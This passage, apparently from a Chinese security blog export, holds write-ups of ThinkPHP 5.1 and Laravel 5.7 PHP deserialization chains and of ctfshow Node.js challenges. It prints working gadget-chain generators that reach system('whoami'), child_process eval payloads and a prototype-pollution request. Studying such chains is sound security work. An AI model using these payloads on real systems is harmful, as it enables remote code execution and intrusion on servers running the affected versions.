Windows()));\n}\n```\n\n![image-20250603163040517](../image/achieve/202411/CVE复现/image-20250603163040517.png)\n\n此时key为我们构造的test，步入该函数，但是最后会返回空值，因为原先relation的值是空的，所以会直接跳过if语句返回空，返回后进入getAttr函数\n\n![image-20250603154909767](../image/achieve/202411/CVE复现/image-20250603154909767.png)\n\n随后进入getData函数\n\n![image-20250603163522680](../image/achieve/202411/CVE复现/image-20250603163522680.png)\n\n可以看到data此时是可控的，所以最后可以得出$relation变量可控，所以就可以触发__call方法，我们传个data试一下\n\n![image-20250603163710022](../image/achieve/202411/CVE复现/image-20250603163710022.png)\n\n成功进入，并返回data中$name键对应的值\n\n![image-20250603173517134](../image/achieve/202411/CVE复现/image-20250603173517134.png)\n\n所以如果我们设置值为一个对象的话，此时就会返回一个对象实例，从而触发`__call()`方法，但是这里的话name来自于append的值，所以我们可以设置值为需要传入`__call()`方法的参数\n\n然后我们来找找`__call()`方法\n\n找到一个think\\Request类\n\n![image-20250603160208458](../image/achieve/202411/CVE复现/image-20250603160208458.png)\n\n这里有个call_user_func_array函数，前面的话检查hook数组中是否有key为method参数的值，并且会在args中插入当前对象实例，这导致了$args不可控\n\n然后我发现在Request类中的filterValue方法\n\n![image-20250603161626954](../image/achieve/202411/CVE复现/image-20250603161626954.png)\n\n这里有一个call_use_func方法，但是怎么触发这个方法呢？\n\n![image-20250603174432019](../image/achieve/202411/CVE复现/image-20250603174432019.png)\n\n在该类的input方法中用函数调用，但是该方法的$data参数不可控，所以这时候需要查找哪里调用input方法了，发现param方法调用了input\n\n![image-20250603174827041](../image/achieve/202411/CVE复现/image-20250603174827041.png)\n\n这里$this->param可控，而name不可控，又需要查找哪里调用param方法，发现isAjax方法调用了param\n\n```php\npublic function isAjax($ajax = false)\n{\n    $value  = $this->server('HTTP_X_REQUESTED_WITH');\n    $result = 'xmlhttprequest' == strtolower($value) ? true : false;\n\n    if (true === $ajax) {\n        return $result;\n    }\n\n    $result           = $this->param($this->config['var_ajax']) ? true : $result;\n    $this->mergeParam = false;\n    return $result;\n}\n```\n\n$this->config可控，就代表param方法中的name参数可控，就代表input方法中data，name参数都可控，找到这条调用链后返回input函数\n\n![image-20250603175155284](../image/achieve/202411/CVE复现/image-20250603175155284.png)\n\n在filterValue方法$filters参数要可控，所以我们跟进getFilter函数\n\n![image-20250603175247585](../image/achieve/202411/CVE复现/image-20250603175247585.png)\n\n这下可以确定$filters参数是可控的，所以我们可以构造链子\n\n```\nthink\\process\\pipes\\Windows::__destruct()->Pivot::__toString()->Request::isAjax()->Request::input()->Request::filterValue()\n```\n\n然后一段段调试和设值\n\n先是让链子跳到Request类的`__call()`方法\n\n```php\n<?php\nnamespace think\\process\\pipes{\n    use think\\model\\Pivot;\n\n    class Windows{\n        private $files = [];\n        public function __construct() {\n            $this -> files = [new Pivot()];\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\nnamespace think{\n    abstract class Model{\n        private $data = [];\n        protected $append = [];\n        public function __construct(){\n            $this -> append = [\"test\" => [\"test\"]];\n            $this -> data = [\"test\" => new Request()];\n        }\n    }\n    class Request{}\n}\nnamespace {\n    use think\\process\\pipes\\Windows;\n    echo base64_encode(serialize(new Windows()));\n}\n```\n\n![image-20250603180543274](../image/achieve/202411/CVE复现/image-20250603180543274.png)\n\n然后我们设置hook的值可以调用isAjax\n\n```php\n<?php\nnamespace think\\process\\pipes{\n    use think\\model\\Pivot;\n\n    class Windows{\n        private $files = [];\n        public function __construct() {\n            $this -> files = [new Pivot()];\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\nnamespace think{\n    abstract class Model{\n        private $data = [];\n        protected $append = [];\n        public function __construct(){\n            $this -> append = [\"test\" => [\"test\"]];\n            $this -> data = [\"test\" => new Request()];\n        }\n    }\n    class Request{\n        protected $hook = [];\n        public function __construct(){\n            $this -> hook = [\"visible\" => [$this,\"isAjax\"]];\n        }\n    }\n}\nnamespace {\n    use think\\process\\pipes\\Windows;\n    echo base64_encode(serialize(new Windows()));\n}\n```\n\n![image-20250603181006343](../image/achieve/202411/CVE复现/image-20250603181006343.png)\n\n随后进入param函数，需要设置param的name值也就是我们的config数组中var_ajax键对应值,但是需要设置什么值呢？\n\n```php\n<?php\nnamespace think\\process\\pipes{\n    use think\\model\\Pivot;\n\n    class Windows{\n        private $files = [];\n        public function __construct() {\n            $this -> files = [new Pivot()];\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\nnamespace think{\n    abstract class Model{\n        private $data = [];\n        protected $append = [];\n        public function __construct(){\n            $this -> append = [\"test\" => [\"test\"]];\n            $this -> data = [\"test\" => new Request()];\n        }\n    }\n    class Request{\n        protected $hook = [];\n        protected $config;\n        protected $param;\n        protected $filter;\n        public function __construct(){\n            $this -> hook = [\"visible\" => [$this,\"isAjax\"]];\n            $this -> config = ['var_ajax'=> 'aaa'];\n            $this -> param = [\"aaa\"=>'whoami'];\n        }\n    }\n}\nnamespace {\n    use think\\process\\pipes\\Windows;\n    echo base64_encode(serialize(new Windows()));\n}\n```\n\n![image-20250603192821251](../image/achieve/202411/CVE复现/image-20250603192821251.png)\n\n注意到input中有一个getData函数\n\n![image-20250603192846161](../image/achieve/202411/CVE复现/image-20250603192846161.png)\n\n很容易就看出来，这里的话设置\n\n```php\n$this -> config = ['var_ajax'=> 'aaa'];\n$this -> param = [\"aaa\"=>'whoami'];\n```\n\nvar_ajax键的值必须等于param的键名，这也才会返回data为whoami，随后进入filterValue函数，这时候就需要设置$filters的值了\n\n![image-20250603193142421](../image/achieve/202411/CVE复现/image-20250603193142421.png)\n\n这里需要关注is_callable函数，该函数用于验证值是否可以在当前范围内作为函数调用\n\n所以最后的exp\n\n## 0x03最终exp\n\n```php\n<?php\nnamespace think\\process\\pipes{\n    use think\\model\\Pivot;\n\n    class Windows{\n        private $files = [];\n        public function __construct() {\n            $this -> files = [new Pivot()];\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\nnamespace think{\n    abstract class Model{\n        private $data = [];\n        protected $append = [];\n        public function __construct(){\n            $this -> append = [\"test\" => [\"test\"]];\n            $this -> data = [\"test\" => new Request()];\n        }\n    }\n    class Request{\n        protected $hook = [];\n        protected $config;\n        protected $param;\n        protected $filter;\n        public function __construct(){\n            $this -> hook = [\"visible\" => [$this,\"isAjax\"]];\n            $this -> config = ['var_ajax'=> 'aaa'];\n            $this -> param = [\"aaa\"=>'whoami'];\n            $this -> filter = \"system\";\n        }\n    }\n}\nnamespace {\n    use think\\process\\pipes\\Windows;\n    echo base64_encode(serialize(new Windows()));\n}\n```\n\n![image-20250603202739851](../image/achieve/202411/CVE复现/image-20250603202739851.png)\n\n## 0x04影响版本\n\n```\n5.1.3 < tp < 5.1.37\n```\n\n## 0x05总结\n\n其实这个exp最后的参数是我调试了一晚上得来的，当时一直没调试出来，卡在is_callable函数检测上，后面发现是我框架版本搞错了，这得益于我环境搭建的时候\n\n```\ncomposer create-project --prefer-dist topthink/think=5.1.* thinkphp5.1.37\n```\n\n这里没有指定版本，导致下载了5.1的最新版本，但是我并不清楚是因为框架版本不同，其中对该函数设置范围的不同导致的，这个结论并没有去验证，后面有机会再研究一下吧\n","tags":["TP5框架"],"categories":["PHP反序列化"]},{"title":"PHP反序列化-Laravel框架","url":"/2025/06/02/PHP反序列化-Laravel框架/","content":"\n刚审完yii框架的反序列化，又来看看Laravel框架的反序列化\n\n## 0x01Laravel框架\n\n官方文档：https://laravel.com/docs/12.x/releases\n\nLaravel 是一个具有高效、优雅语法的 Web 应用框架。它提供了创建应用程序的结构和起点巴拉巴拉一顿夸，这里就越过了\n\n## 0x02漏洞描述\n\nLaravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码\n\n对PHP版本的要求：php 7.1.3以上\n\n## 0x03靶场搭建\n\n源码地址：https://github.com/laravel/laravel/tree/5.7\n\n也可以用composer安装\n\n```\ncomposer create-project laravel/laravel=5.7.* --prefer-dist Laravel5.7\n```\n\n![image-20250602100639767](../image/achieve/202411/CVE复现/image-20250602100639767.png)\n\n然后运行服务\n\n```\nphp artisan serve\n```\n\n访问8000端口就行\n\n因为在laravel框架中并没用触发反序列化的点，所以我们需要自己手写一个demo\n\n在app\\http\\Controllers下新建控制器TestController.php\n\n```php\n<?php\nnamespace App\\Http\\Controllers;\n\nclass TestController {\n    public function test(){\n        if(isset($_GET['poc'])){\n            unserialize($_GET['poc']);\n        }else{\n            highlight_file(__FILE__);\n        }\n        return \"success\";\n    }\n}\n\n```\n\n然后在routes\\web.php添加路由\n\n```\nRoute::get('/test','test_Controller@test');//类名@方法名\n```\n\n然后访问test路由\n\n![image-20250602110840859](../image/achieve/202411/CVE复现/image-20250602110840859.png)\n\n## 0x04漏洞复现\n\n相比于5.7之前的版本，5.7之后新加入了一个PendingCommand类，我们看看官方对这个类的解释\n\n![image-20250523174412014](../image/achieve/202411/CVE复现/image-20250523174412014.png)\n\n大致可以看出这个类主要是用来执行命令的，里面有两个受保护的属性string和array分别标表示需要运行的命令和要传递给命令的参数。（在5.7中是$command和$parameters）\n\n话不多说，我们看看源码\n\n要触发反序列化漏洞，必然是在`__destruct()`方法做文章，先看看这个方法\n\n![image-20250523174604474](../image/achieve/202411/CVE复现/image-20250523174604474.png)\n\n这里调用了run方法，但是需要避开if语句，不过hasExecuted本来便是false\n\n```php\nprotected $hasExecuted = false;\n```\n\n那我们直接看run方法\n\n![image-20250523174938910](../image/achieve/202411/CVE复现/image-20250523174938910.png)\n\n这里写着是执行命令的函数，所以这里必然就是我们触发RCE的点了，传个payload然后调试一下看看代码的走向\n\nexp\n\n```php\n<?php\nnamespace Illuminate\\Foundation\\Testing{\n    class PendingCommand{\n        protected $command;\n        protected $parameters;\n        public function __construct(){\n            $this -> command = \"phpinfo\";\n            $this -> parameters[] = \"1\";\n        }\n    }\n}\n\nnamespace {\n    use Illuminate\\Foundation\\Testing\\PendingCommand;\n    echo urlencode(serialize(new PendingCommand()));\n}\n```\n\n打好断点后开始调试\n\n![image-20250524135551178](../image/achieve/202411/CVE复现/image-20250524135551178.png)反序列化触发__destruct()后进入run()\n\n![image-20250602111324310](../image/achieve/202411/CVE复现/image-20250602111324310.png)\n\n我们分析一下这段代码\n\n运行命令的代码在136行\n\n```php\ntry {\n    $exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);\n}\n```\n\n需要进入运行命令的代码，就需要经过133行的代码\n\n跳断点发现并没有跳到136行代码，所以猜测是问题出现在133行代码的执行上\n\n```php\n$this->mockConsoleOutput();\n```\n\n这段代码主要是用来模拟终端的输入和输出的，继续前进就进入这个函数\n\n跟进一下\n\n```php\nprotected function mockConsoleOutput()\n{\n    $mock = Mockery::mock(OutputStyle::class.'[askQuestion]', [\n        (new ArrayInput($this->parameters)), $this->createABufferedOutputMock(),\n    ]);\n\n    foreach ($this->test->expectedQuestions as $i => $question) {\n        $mock->shouldReceive('askQuestion')\n            ->once()\n            ->ordered()\n            ->with(Mockery::on(function ($argument) use ($question) {\n                return $argument->getQuestion() == $question[0];\n            }))\n            ->andReturnUsing(function () use ($question, $i) {\n                unset($this->test->expectedQuestions[$i]);\n\n                return $question[1];\n            });\n    }\n\n    $this->app->bind(OutputStyle::class, function () use ($mock) {\n        return $mock;\n    });\n}\n```\n\n这里的话有Mockery类和ArrayInput类，中间会经过spl_autoload_call->load->loadclass，其实就是用来加载类的，不用管，随后会调用createABufferedOutputMock类，我们跟进一下\n\n```php\nprivate function createABufferedOutputMock()\n{\n    $mock = Mockery::mock(BufferedOutput::class.'[doWrite]')\n            ->shouldAllowMockingProtectedMethods()\n            ->shouldIgnoreMissing();\n\n    foreach ($this->test->expectedOutput as $i => $output) {\n        $mock->shouldReceive('doWrite')\n            ->once()\n            ->ordered()\n            ->with($output, Mockery::any())\n            ->andReturnUsing(function () use ($i) {\n                unset($this->test->expectedOutput[$i]);\n            });\n    }\n\n    return $mock;\n}\n```\n\n这个类是用来模拟和调试控制台输入输出的函数，这里又调用了Mockery对象中的mock函数，步入mock函数后直接走就行，没必要看中间在经过哪些函数和变量\n\n然后发现代码在执行完$mock的赋值之前就终止了\n\n![image-20250524143141421](../image/achieve/202411/CVE复现/image-20250524143141421.png)\n\n那就可以看出链子在哪里出了问题\n\n```\nforeach ($this->test->expectedOutput as $i => $output) {\n        $mock->shouldReceive('doWrite')\n```\n\n此时在createABufferedOutputMock()方法中要进入for循环，这里的话会获取test对象中的expectedOutput，然后发现这个属性并没有在实例化对象test中出现，这个属性在`trait InteractsWithConsole`中，而trait类我们没法实例化，在其他我们可以实例化的类中，也没有一个类存在`expectedOutput`属性，此外就只有一些测试类有这个属性，所以这里如果需要链子继续下去的话我们需要对expectedOutput进行操作\n\n所以可以想到，在访问不存在或不可访问的属性的时候会触发`__get()`方法，并且这里的test是可控的，所以我们全局搜索一下\n\n在Illuminate\\Auth\\GenericUser的__get中存在一个`__get()`方法\n\n```php\npublic function __get($key)\n{\n    return $this->attributes[$key];\n}\n```\n\n这里的话attributes参数是可控的，所以我们直接给attributes赋值一个键名为expectedOutput的数组，然后让test属性指向该对象，试图触发`__get()`方法\n\n![image-20250602121358570](../image/achieve/202411/CVE复现/image-20250602121358570.png)\n\n成功触发`__get()`方法，并且for循环成功执行并退出createABufferedOutputMock方法\n\n![image-20250602121500847](../image/achieve/202411/CVE复现/image-20250602121500847.png)\n\n返回到mockConsoleOutput()中发现还需要设置一个属性\n\n![image-20250602121713484](../image/achieve/202411/CVE复现/image-20250602121713484.png)\n\n跟着做就行了\n\n但是还是卡住了\n\n![image-20250602123437713](../image/achieve/202411/CVE复现/image-20250602123437713.png)\n\n意思是我们没有一个对象在调用bind函数\n\n来到180行\n\n```php\n$this->app->bind(OutputStyle::class, function () use ($mock) {\n    return $mock;\n});\n```\n\n这里需要调用bind函数，那我们跟进一下这个函数，在Illuminate\\Container\\Container类中\n\n![image-20250602132328410](../image/achieve/202411/CVE复现/image-20250602132328410.png)\n\n对app属性设置为这个类的实例化对象就行了\n\n```php\n<?php\nnamespace Illuminate\\Container{\n    class Container{}\n}\n\nnamespace Illuminate\\Auth{\n    class GenericUser{\n        protected $attributes=[];\n        public function __construct()\n        {\n            $this->attributes['expectedOutput']=['1'];\n            $this->attributes['expectedQuestions']=['1'];\n        }\n    }\n}\nnamespace Illuminate\\Foundation\\Testing{\n\n    use Illuminate\\Auth\\GenericUser;\n    use Illuminate\\Container\\Container;\n    class PendingCommand{\n        protected $command;\n        protected $parameters;\n        public $test;\n        protected $app;\n        public function __construct(){\n            $this -> command = \"phpinfo\";\n            $this -> parameters[] = \"1\";\n            $this -> app = new Container();\n            $this -> test = new GenericUser();\n        }\n    }\n}\nnamespace {\n    use Illuminate\\Foundation\\Testing\\PendingCommand;\n    echo urlencode(serialize(new PendingCommand()));\n}\n```\n\n然后就可以走通了，接下来，就是最关键的产生漏洞的代码点。\n\n```php\n$exitCode = $this->app[Kernel::class]->call($this->command, $this->parameters);\n```\n\n这里的话通过实例化Illuminate\\Contracts\\Console\\Kernel对象并调用call函数执行命令，猜测开发者的本意应该是实例化`Illuminate\\Contracts\\Console\\Kernel`这个类，但是在`getConcrete`这个方法中出了问题，导致可以利用php的反射机制实例化任意类。而问题出在`vendor/laravel/framework/src/Illuminate/Container/Container.php`的704行\n\n![image-20250602145533130](../image/achieve/202411/CVE复现/image-20250602145533130.png)\n\n可以看到这里判断`$this->bindings[$abstract])`是否存在，若存在则返回`$this->bindings[$abstract]['concrete']`。$bindings是Container类的一个属性，如果我们能控制该属性的值，要寻找一个继承自`Container`的类，而`Illuminate\\Foundation\\Application`恰好继承自`Container`类，所以我们选择该对象传入`$this->app`的，由于我们已知`$abstract`变量为`Illuminate\\Contracts\\Console\\Kernel`，所以我们只需通过反序列化定义`Illuminate\\Foundation\\Application`的`$bindings`属性存在键名为`Illuminate\\Contracts\\Console\\Kernel`的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是`Illuminate\\Foundation\\Application`类，然后就可以执行call方法实现RCE\n\n## 0x05exp编写\n\n所以最终的exp\n\n```php\n<?php\nnamespace Illuminate\\Foundation{\n    class Application\n    {\n        protected $bindings = [];\n\n        public function __construct()\n        {\n            $this->bindings = array(\n                'Illuminate\\Contracts\\Console\\Kernel' => array(\n                    'concrete' => 'Illuminate\\Foundation\\Application'\n                )\n            );\n        }\n    }\n}\nnamespace Illuminate\\Auth{\n    class GenericUser{\n        protected $attributes=[];\n        public function __construct()\n        {\n            $this->attributes['expectedOutput']=['1'];\n            $this->attributes['expectedQuestions']=['1'];\n        }\n    }\n}\nnamespace Illuminate\\Foundation\\Testing{\n\n    use Illuminate\\Auth\\GenericUser;\n    use Illuminate\\Foundation\\Application;\n    class PendingCommand{\n        protected $command;\n        protected $parameters;\n        public $test;\n        protected $app;\n        public function __construct(){\n            $this -> command = \"phpinfo\";\n            $this -> parameters[] = \"1\";\n            $this -> app = new Application();\n            $this -> test = new GenericUser();\n        }\n    }\n}\nnamespace {\n    use Illuminate\\Foundation\\Testing\\PendingCommand;\n    echo urlencode(serialize(new PendingCommand()));\n}\n\n```\n\n![image-20250602145831041](../image/achieve/202411/CVE复现/image-20250602145831041.png)\n\n![image-20250602150614975](../image/achieve/202411/CVE复现/image-20250602150614975.png)\n\n成功执行RCE\n\n## 0x06exp二开\n\n在挖掘之前我讲一个自己发现的遗憾的地方\n\n这个是我刚刚在找`__get()方法`的时候就发现了一个很好玩的类\\Faker\\Generator类\n\n```php\npublic function __get($attribute)\n{\n    return $this->format($attribute);\n}\n```\n\n跟进format后\n\n```php\npublic function format($formatter, $arguments = array())\n{\n    return call_user_func_array($this->getFormatter($formatter), $arguments);\n}\n```\n\n这不是yii2框架的东西嘛，怎么还串门了，好神奇，跟进getFormatter发现也是一模一样，那看看是否可以用yii的链子，正则搜索一下\n\n```\ncall_user_func\\(\\$this->([a-zA-Z0-9]+), \\$this->([a-zA-Z0-9]+)\n```\n\n![image-20250602150745666](../image/achieve/202411/CVE复现/image-20250602150745666.png)\n\n不过这个是抽象类，不能被实例化，找找他的继承类\n\n![image-20250602151112375](../image/achieve/202411/CVE复现/image-20250602151112375.png)\n\n那我们试着写一下链子\n\n```\nPendingCommand::____destruct()->PendingCommand::run()->PendingCommand::mockConsoleOutput()->Generator::__get()->AuthorTest::stopOutputBuffering()\n```\n\n```php\n<?php\nnamespace PharIo\\Manifest{\n    class AuthorTest{\n        private $outputCallback;\n        private $output;\n        public function __construct(){\n            $this->outputCallback = \"system\";\n            $this->output = \"whoami\";\n        }\n    }\n}\nnamespace Faker{\n    use PharIo\\Manifest\\AuthorTest;\n    class Generator {\n        private $formatters;\n        public function __construct() {\n            $this->formatters['expectedQuestions'] =[new AuthorTest(),'stopOutputBuffering'];\n        }\n    }\n}\nnamespace Illuminate\\Foundation\\Testing{\n    use \\Faker\\Generator;\n    class PendingCommand{\n        protected $command;\n        protected $parameters;\n        public $test;\n        public function __construct(){\n            $this -> command = \"1\";\n            $this -> parameters[] = \"1\";\n            $this -> test = new Generator();\n        }\n    }\n}\nnamespace{\n    use Illuminate\\Foundation\\Testing\\PendingCommand;\n    echo urlencode(serialize(new PendingCommand));\n}\n\n```\n\n看了半天发现call_user_func所在的函数stopOutputBuffering是私有属性，只能类内部访问。那就打不通了\n\n好了回到正题，我们接着找找可利用的`__get()`方法\n\n找到一个类Faker\\DefaultGenerator的get方法\n\n```php\npublic function __get($attribute)\n{\n    return $this->default;\n}\n```\n\n看看$default参数是否可控\n\n```php\n    public function __construct($default = null)\n    {\n        $this->default = $default;\n    }\n```\n\n这里`__get`有返回值，可以做，那我们改一下我们之前的exp1\n\n```php\n<?php\nnamespace Illuminate\\Foundation{\n    class Application\n    {\n        protected $bindings = [];\n\n        public function __construct()\n        {\n            $this->bindings = array(\n                'Illuminate\\Contracts\\Console\\Kernel' => array(\n                    'concrete' => 'Illuminate\\Foundation\\Application'\n                )\n            );\n        }\n    }\n}\nnamespace Faker{\n    class DefaultGenerator{\n        protected $default = array(1,1);\n    }\n}\nnamespace Illuminate\\Foundation\\Testing{\n\n    use Faker\\DefaultGenerator;\n    use Illuminate\\Foundation\\Application;\n\n    class PendingCommand{\n        protected $command;\n        public $test;\n        protected $app;\n        protected $parameters;\n\n        public function __construct(){\n            $this -> command = \"phpinfo\";\n            $this -> parameters[] = \"1\";\n            $this -> app = new Application();\n            $this -> test = new DefaultGenerator();\n        }\n    }\n}\nnamespace {\n    use Illuminate\\Foundation\\Testing\\PendingCommand;\n    echo urlencode(serialize(new PendingCommand()));\n}\n```\n\n需要注意的一点，该漏洞只对laravel v5.7版本有效。因为5.7之前的版本并不存在入口类\n\n## 0x07exp2\n\n做到web272的时候发现pendingCommand类被禁了，说明这里还有东西可以挖，我们继续挖一下\n\n先找找`__destruct()`入口\n\n找到一个类Illuminate\\Broadcasting\\PendingBroadcast，其实也不算找到吧，就是偶然发现了有这么一条链子\n\n```php\n    public function __destruct()\n    {\n        $this->events->dispatch($this->event);\n    }\n```\n\n看看参数是否可控\n\n```php\n    public function __construct(Dispatcher $events, $event)\n    {\n        $this->event = $event;\n        $this->events = $events;\n    }\n```\n\nevents参数和event参数都可控，那此时的思路有了，要么找到dispatch方法可利用的类，要么触发`__call()方法`\n\n不过我更倾向于用`__call`方法，先用`__call()`来做突破点，跟进`src/Faker/Generator.php`中的`__call()`方法，发现其调用了`format()`方法，进而调用`getFormatter()`方法\n\n![image-20250602155617880](../image/achieve/202411/CVE复现/image-20250602155617880.png)\n\n由于`getFormatter()`方法中的`$this->formatters[$formatter]`是可控的并直接 return 回上一层，因此可以利用该可控参数来进行命令执行 RCE 操作\n\n```php\n<?php\nnamespace Illuminate\\Broadcasting {\n    use Faker\\Generator;\n    class PendingBroadcast {\n        protected $events;\n        protected $event;\n        public function __construct() {\n            $this->events = new Generator();\n            $this->event = 'whoami';\n        }\n    }\n}\n\nnamespace Faker {\n    class Generator {\n        protected $formatters = array();\n        public function __construct(){\n            $this -> formatters = ['dispatch' => 'system'];\n        }\n    }\n}\nnamespace {\n    $a = new Illuminate\\Broadcasting\\PendingBroadcast();\n    echo urlencode(serialize($a));\n}\n\n```\n\n我发现Laravel5.7版本增加了wakeup方法修复了这条链子，原来这条链子是远古链子啊。。。\n\n![image-20250602162924419](../image/achieve/202411/CVE复现/image-20250602162924419.png)\n\n我发现这个框架的链子还是蛮多的，这里分享师傅的一篇文章https://www.anquanke.com/post/id/258264\n","tags":["Laravel框架"],"categories":["PHP反序列化"]},{"title":"ctfshow入门nodejs","url":"/2025/05/30/ctfshow入门nodejs/","content":"\nNodejs是一个基于ChromeV8引擎的js运行环境，所以可以认为nodejs是一个JavaScript的解释器\n\n## web334\n\n一个登录界面,扫目录看到一个假的flag，有一个附件，用压缩包形式打开，有一个login.js和user.js\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar users = require('../modules/user').items;\n \nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n\n/* GET home page. */\nrouter.post('/', function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var sess = req.session;\n  var user = findUser(req.body.username, req.body.password);\n \n  if(user){\n    req.session.regenerate(function(err) {\n      if(err){\n        return res.json({ret_code: 2, ret_msg: '登录失败'});        \n      }\n       \n      req.session.loginUser = user.username;\n      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              \n    });\n  }else{\n    res.json({ret_code: 1, ret_msg: '账号或密码错误'});\n  }  \n  \n});\n\nmodule.exports = router;\n\n```\n\n```javascript\n//user.js\nmodule.exports = {\n  items: [\n    {username: 'CTFSHOW', password: '123456'}\n  ]\n};\n```\n\n登录成功就有flag，我们先看一下代码\n\n在登录界面使用findUser检测函数对输入的用户名和密码进行检测\n\n```javascript\nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;\n  });\n};\n```\n\n这里的话要求用户名不能是CTFSHOW，但是会进行一个转大写的操作，然后第二行就是从user.js中取用户名和密码\n\n所以直接传ctfshow就行\n\n```\nctfshow\n123456\n```\n\n## web335\n\n### #nodejs的RCE\n\n`where is flag?`\n\n在源码找到一个参数`?eval=`，传入后有回显，可能是有回显的RCE或者SSTI猜测代码如下\n\n```\neval(console.log(val eval))\n```\n\n然后我们去搜一下这个函数\n\n![image-20250530114039641](../image/achieve/202411/nodejs--ctfshow/image-20250530114039641.png)\n\n所以我们传一个js代码看看，找找有没有RCE的函数\n\n在 Node.js 中，执行系统命令主要通过 `child_process` 模块实现。我们看看这个模块下的`execSync`函数\n\n![image-20250530114715021](../image/achieve/202411/nodejs--ctfshow/image-20250530114715021.png)\n\n那我们试一下\n\n```\n?eval=require(%27child_process%27).execSync('ls')\n```\n\n然后就看到flag文件了，直接读就行\n\n当然也可以用另一个函数spawnSync\n\n```\n?eval=require(\"child_process\").spawnSync('ls',['./']).stdout.toString()\n?eval=require(\"child_process\").spawnSync('cat',['./f*']).stdout.toString()\n```\n\n之前不是说可能是ssti嘛，然后我测出来也存在SSTI\n\n## web336\n\n过滤了exec，用spawnSync就行\n\n![image-20250530115732978](../image/achieve/202411/nodejs--ctfshow/image-20250530115732978.png)\n\n需要注意这里因为返回值不是字符串而是数组，所以需要转为字符串输出\n\n```\n?eval=require(\"child_process\").spawnSync('cat',['./f*']).stdout.toString()\n```\n\n## web337\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){\n  \tres.end(flag);\n  }else{\n  \tres.render('index',{ msg: 'tql'});\n  }\n  \n});\n\nmodule.exports = router;\n```\n\n一个md5强比较，用数组去绕过就可以了\n\n```\n?a[:]=1&b[:]=1\n```\n\n## web338\n\n### #原型链污染\n\n有源码，审计一下\n\n在utils目录下common.js文件中发现有合并函数\n\n```javascript\n\n\nmodule.exports = {\n  copy:copy\n};\n\nfunction copy(object1, object2){\n    for (let key in object2) {\n        if (key in object2 && key in object1) {\n            copy(object1[key], object2[key])\n        } else {\n            object1[key] = object2[key]\n        }\n    }\n  }\n```\n\n然后我们看一下登录逻辑\n\n```javascript\n//login.js\nvar express = require('express');\nvar router = express.Router();\nvar utils = require('../utils/common');\n\n\n\n/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n  \n  \n});\n\nmodule.exports = router;\n\n```\n\n这里的话定义了两个空对象，然后会解析我们请求体中的json数据，然后传入req.body进行合并，之后访问secert的ctfshow属性，直接污染他的原型就行\n\n所以这是一个很简单的nodejs原型链污染\n\n本地测试一下\n\n```javascript\nfunction copy(object1, object2){\n    for (let key in object2) {\n        if (key in object2 && key in object1) {\n            copy(object1[key], object2[key])\n        } else {\n            object1[key] = object2[key]\n        }\n    }\n}\n\nvar user = {}\nvar secret = {}\n\nvar a = JSON.parse('{\"__proto__\":{\"ctfshow\" : \"36dboy\"}}')\n\ncopy(user,a)\nconsole.log(secret.ctfshow)\n//36dboy\n\n```\n\n然后直接污染\n\n```\nPOST /login HTTP/1.1\nHost: c13e35ba-bf86-473d-9015-37157246936f.challenge.ctf.show\nConnection: keep-alive\nContent-Length: 31\nsec-ch-ua-platform: \"Windows\"\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36\nAccept: application/json, text/javascript, */*; q=0.01\nsec-ch-ua: \"Chromium\";v=\"136\", \"Google Chrome\";v=\"136\", \"Not.A/Brand\";v=\"99\"\nContent-Type: application/json\nsec-ch-ua-mobile: ?0\nOrigin: https://c13e35ba-bf86-473d-9015-37157246936f.challenge.ctf.show\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://c13e35ba-bf86-473d-9015-37157246936f.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\n\n\n{\"__proto__\":{\"ctfshow\":\"36dboy\"}}\n```\n\n## web339\n\n### 